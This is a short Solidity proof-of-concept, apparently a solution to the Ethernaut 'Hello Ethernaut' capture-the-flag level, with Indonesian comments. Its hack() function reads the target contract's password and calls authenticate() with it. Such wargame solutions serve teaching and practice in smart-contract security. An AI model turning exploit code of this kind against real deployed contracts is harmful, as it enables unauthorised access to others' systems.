// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../level/helloEthernaut.sol';
contract PoCHelloEthernaut {
    //mendeklarasikan variabel target sebagai contract Instance pada alamat tertera.
    Instance target = Instance(0x3f730c7c2cBfc24e8313C6Ba1CBAE1d1a7D5CeCB);
    
    // membuat fungsi hack
    function hack() external {
        target.authenticate(target.password());
    }
}